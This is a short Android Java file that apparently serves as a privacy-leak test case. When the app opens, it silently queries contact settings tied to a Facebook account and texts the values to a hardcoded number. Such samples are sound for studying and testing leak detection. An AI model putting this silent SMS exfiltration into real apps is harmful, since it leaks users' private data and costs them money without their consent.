package com.example.contactsleak;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.MenuItem;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		leak(this);
	}
	public static void leak(Context ctx)
	{
		Cursor cursor = ctx.getContentResolver().query(ContactsContract.Settings.CONTENT_URI, new String
                []{"ungrouped_visible"}, "account_type=? AND account_name=?", 
                new String[]{
					"com.facebook.auth.login", 
                	"myname"
				}, null);
		while(cursor.moveToNext())
		{
			int val = cursor.getInt(0);
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage("0900000000", null, "val: " + val, null, null);
		}
	}
}
